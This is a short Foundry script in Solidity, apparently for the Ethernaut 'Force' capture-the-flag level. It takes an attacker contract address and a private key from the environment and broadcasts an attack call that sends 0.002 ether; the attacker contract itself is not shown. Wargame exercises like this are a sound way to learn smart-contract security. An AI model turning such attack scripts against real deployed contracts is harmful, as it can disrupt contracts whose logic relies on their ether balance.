// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {ForceAttacker} from "../src/ForceAttacker.sol";

contract ForceAttack is Script {
  function run() public{
    address forceAttackerAddress = vm.envAddress("ATTACKER_CONTRACT");
    uint256 attackerPK = vm.envUint("PRIVATE_KEY");

    ForceAttacker forceAttacker = ForceAttacker(payable(forceAttackerAddress));

    vm.startBroadcast(attackerPK);

    forceAttacker.attack{value: 0.002 ether, gas: 30000}();

    vm.stopBroadcast();
  }
}